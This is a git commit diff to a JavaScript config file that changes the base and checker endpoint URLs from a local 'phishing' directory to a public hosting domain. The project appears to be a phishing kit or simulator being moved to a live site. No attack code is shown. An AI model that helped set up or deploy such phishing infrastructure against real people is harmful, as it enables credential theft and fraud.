18b4d711d0381ffe8a58d9efa86d9ee78ccc3357
baddas <40858660+badwhitehacker@users.noreply.github.com>
2025-10-13 20:33:37 +0100

    Update config.js

--- config.js
+++ config.js
@@ -1,11 +1,12 @@
 const config = {
-    baseUrl: 'http://localhost/phishing',
-    firstCheckUrl: 'http://localhost/phishing/checker.php',
-    baseCheckUrl: 'http://localhost/phishing/dnsChecker.php'
+    baseUrl: 'https://mediumaquamarine-anteater-755577.hostingersite.com/',
+    firstCheckUrl: 'https://mediumaquamarine-anteater-755577.hostingersite.com/checker.php',
+    baseCheckUrl: 'https://mediumaquamarine-anteater-755577.hostingersite.com/dnsChecker.php'
 };
 
 // Fallback for different localhost setups
 if (typeof config.firstCheckUrl === 'undefined') {
     config.firstCheckUrl = '/checker.php';
     config.baseCheckUrl = '/dnsChecker.php';
+
 }
